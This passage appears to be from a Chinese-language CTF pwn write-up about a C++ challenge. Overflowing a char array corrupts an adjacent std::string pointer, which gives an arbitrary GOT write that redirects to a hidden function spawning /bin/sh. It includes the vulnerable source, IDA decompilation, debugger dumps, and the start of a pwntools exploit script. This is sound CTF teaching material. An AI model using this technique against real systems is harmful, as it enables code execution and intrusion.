class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;array&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Test</span> &#123;</span></span><br><span class=\"line\">\tTest() &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::fill(_c_str, _c_str + <span class=\"number\">0x20</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* <span class=\"title function_\">c_str</span><span class=\"params\">()</span> &#123; <span class=\"keyword\">return</span> _c_str; &#125;</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span>&amp; <span class=\"title function_\">str</span><span class=\"params\">()</span> &#123; <span class=\"keyword\">return</span> _str; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">\t__attribute__((used))</span><br><span class=\"line\">\t<span class=\"type\">void</span> <span class=\"title function_\">call_me</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> _c_str[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> _str;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\tTest test;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;1. set c_str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;2. get c_str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;3. set str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;4. get str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>.good()) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> choice = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;choice: &quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; choice;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span> (choice) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>: <span class=\"comment\">// set c_str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;c_str: &quot;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; test.c_str();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>: <span class=\"comment\">// get c_str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;c_str: &quot;</span> &lt;&lt; test.c_str() &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>: <span class=\"comment\">// set str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;str: &quot;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; test.str();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>: <span class=\"comment\">// get str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;str: &quot;</span> &lt;&lt; test.str() &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">default</span>: <span class=\"comment\">// otherwise exit</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;bye!&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对照 ida 来看<br>\n定义的函数连函数指针都没放在结构体力 只有 string 的指针和 char 这个字符数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v9; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v12; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v13; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v14; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v15; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v16; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v17; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v18; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v19; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> choice; <span class=\"comment\">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> test[<span class=\"number\">72</span>]; <span class=\"comment\">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v23; <span class=\"comment\">// [rsp+58h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v23 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  Test::Test((Test *)test);                     <span class=\"comment\">// 创建一个对象</span></span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  v3 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;1. set c_str&quot;</span>);</span><br><span class=\"line\">  v4 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v5 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v4, <span class=\"string\">&quot;2. get c_str&quot;</span>);</span><br><span class=\"line\">  v6 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v5, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v7 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v6, <span class=\"string\">&quot;3. set str&quot;</span>);</span><br><span class=\"line\">  v8 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v7, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v9 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v8, <span class=\"string\">&quot;4. get str&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v9, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( (<span class=\"type\">unsigned</span> __int8)<span class=\"built_in\">std</span>::ios::good(&amp;unk_404230) )<span class=\"comment\">// ctrl + d exit good</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    choice = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;choice: &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::istream::operator&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, &amp;choice);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( choice == <span class=\"number\">4</span> )                          <span class=\"comment\">// std::cout &lt;&lt; &quot;str: &quot; &lt;&lt; test.str() &lt;&lt; std::endl;</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v15 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;str: &quot;</span>);</span><br><span class=\"line\">      v16 = Test::str[abi:cxx11](test);         <span class=\"comment\">// [1] &lt;&lt;- 其实就是返回一个地址</span></span><br><span class=\"line\">      v17 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"type\">char</span>&gt;(v15, v16);</span><br><span class=\"line\">      <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v17, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( choice &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> ( choice )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;str: &quot;;</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;str: &quot;</span>);</span><br><span class=\"line\">          v14 = Test::str[abi:cxx11](test);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&gt;&gt;&lt;<span class=\"type\">char</span>&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, v14);<span class=\"comment\">// std::cin &gt;&gt; test.str();</span></span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;c_str: &quot;;</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;c_str: &quot;</span>);</span><br><span class=\"line\">          v10 = Test::c_str((Test *)test);      <span class=\"comment\">// return this</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&gt;&gt;&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, v10);<span class=\"comment\">// std::cin &gt;&gt; test.c_str();</span></span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;c_str: &quot; &lt;&lt; test.c_str() &lt;&lt; std::endl;</span></span><br><span class=\"line\">          v11 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;c_str: &quot;</span>);</span><br><span class=\"line\">          v12 = Test::c_str((Test *)test);</span><br><span class=\"line\">          v13 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v11, v12);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v13, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">          v18 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;bye!&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v18, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">          v19 = <span class=\"number\">0</span>;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_15;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v19 = <span class=\"number\">1</span>;</span><br><span class=\"line\">LABEL_15:</span><br><span class=\"line\">  Test::~Test((Test *)test);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v19;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输入 0x1f 个 A 到 char 里和 0x8 个到 string 里<br>\n可以看到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x007fff9d71f280</span>│+<span class=\"number\">0x0000</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f288</span>│+<span class=\"number\">0x0008</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f290</span>│+<span class=\"number\">0x0010</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f298</span>│+<span class=\"number\">0x0018</span>: <span class=\"number\">0x41414141414141</span> (<span class=\"string\">&quot;AAAAAAA&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2a0</span>│+<span class=\"number\">0x0020</span>: <span class=\"number\">0x007fff9d71f2b0</span>  →  <span class=\"string\">&quot;BBBBBBBB&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2a8</span>│+<span class=\"number\">0x0028</span>: <span class=\"number\">0x0000000000000008</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2b0</span>│+<span class=\"number\">0x0030</span>: <span class=\"string\">&quot;BBBBBBBB&quot;</span></span><br></pre></td></tr></table></figure>\n<p>string 第一个是指针 指向堆上<br>\n我们可以劫持这个指针来进行任意写 具体原因如下</p>\n<blockquote>\n<p><code>string</code>  は「文字列を格納するアドレス (8bytes), 長さ (8bytes), 文字列 (短ければここに、長ければ heap 上に)」<br>\nという構造をしています。なので「文字列を格納するアドレス」を  <code>test.c_str()</code>  のオーバーフローで<br>\n書き換えれば GOT に任意書き込みができます。これで  <code>call_me</code>  を呼べるようにします。</p>\n</blockquote>\n<p>至于最后一个难题就是选择 got 表了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x404018</span> &lt;_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@got.plt&gt;: <span class=\"number\">0x0000000000401030</span>      <span class=\"number\">0x00007ffff7ee5d70</span></span><br><span class=\"line\"><span class=\"number\">0x404028</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@got.plt&gt;:   <span class=\"number\">0x0000000000401050</span>      <span class=\"number\">0x0000000000401060</span></span><br><span class=\"line\"><span class=\"number\">0x404038</span> &lt;__cxa_atexit@got.plt&gt;:        <span class=\"number\">0x00007ffff7c07de0</span>      <span class=\"number\">0x0000000000401080</span></span><br><span class=\"line\"><span class=\"number\">0x404048</span> &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt&gt;:     <span class=\"number\">0x00007ffff7f01bb0</span>      <span class=\"number\">0x00007ffff7f006d0</span></span><br><span class=\"line\"><span class=\"number\">0x404058</span> &lt;__stack_chk_fail@got.plt&gt;:    <span class=\"number\">0x00000000004010b0</span>      <span class=\"number\">0x00000000004010c0</span></span><br><span class=\"line\"><span class=\"number\">0x404068</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@got.plt&gt;:   <span class=\"number\">0x00007ffff7f114b0</span>      <span class=\"number\">0x00007ffff7c4cad0</span></span><br><span class=\"line\"><span class=\"number\">0x404078</span> &lt;_ZNSt8ios_base4InitC1Ev@got.plt&gt;:     <span class=\"number\">0x00007ffff7e890f0</span>      <span class=\"number\">0x00007ffff7ee2bb0</span></span><br><span class=\"line\"><span class=\"number\">0x404088</span> &lt;_Unwind_Resume@got.plt&gt;:      <span class=\"number\">0x0000000000401110</span>      <span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>个人最开始是写 <code>__stack_chk_fail</code>  的 然后想着用 pwntools 的 shutdown<br>\n 但是析构的时候会 free 掉 string 导致系统提前崩<br>\n所以按 wp 就是改 <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code>  了<br>\n具体可能是试一个个出来的</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">ri      = <span class=\"keyword\">lambda</span>                    :raw_input()</span><br><span class=\"line\">ps      = <span class=\"keyword\">lambda</span>                    :pause()</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">struct Test &#123;</span></span><br><span class=\"line\"><span class=\"string\">\tchar _c_str[0x20];</span></span><br><span class=\"line\"><span class=\"string\">\tstd::string _str;</span></span><br><span class=\"line\"><span class=\"string\">&#125;;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_c_str</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;c_str: &quot;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title 